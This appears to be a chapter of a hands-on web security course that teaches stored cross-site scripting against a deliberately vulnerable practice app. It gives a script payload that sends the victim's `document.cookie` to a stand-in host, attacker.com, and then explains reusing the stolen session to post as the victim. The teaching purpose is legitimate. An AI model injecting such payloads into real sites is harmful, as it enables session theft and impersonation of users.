XSS 1 - Session jacking!
------------------------

![image](img/Axe.png)


In this chapter we are going to practice **Stored Cross Site Scripting** attacks (or, as it is most commonly called, Stored XSS) to steal the users' session.

To start, try to understand what the *session* is. How does the system know you are logged in? `Charles` might help you in this case.

### Read some stuff

Now, I recommend that you to read what [OWASP has to say about XSS](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29).

Did you read it? so fast? no no no, click on the link and educate yourself!

### XSS attack breakdown

1. **The attacker** send a message with a malicious script in it.
2. The script is stored in the database.
2. As **the victim** reads the message, they are printed from the database to the browser and the scripts executes.
3. The script sends **the victim's** cookies to **the attacker's** machine.
4. **The attacker** uses the cookie to log into the system posing as **the victim**.

### Hack some stuff

If you haven't yet created a user, i suggest you register **NOW**!

Cool, now for the fun stuff, you are going to use your newly acquired knowledge to post a malicious message on Gibson's wall. 

Due to the fact that the messages' content is not sanitised, you will be able to inject scripts into it!

For example, post this message: 

```
This message changes the tab's title! <script>document.title="hacked!";</script>
```
Check out how the window's title has changed to "hacked!".. ! (omg omg!)

### Grab the session

For our next trick we are going to steal the users session cookie!

Take a look at the following code:

```
Just a normal message, nothing to see here! <script>$.get("http://www.attacker.com:3000/?"+document.cookie)</script>
```

See the script in the end if the line? This will send the victim's session (stored in document.cookie) to the `serve` application that is running on the attacker's machine.

If you did it right, in the `serve` screen you should end up with something like this:

Us the `Cookie Editor` in your chrome, to change the session id to the victim's session you just captured and refresh the page.

You can consider yourself successful once you've posted a message in the victim's name.
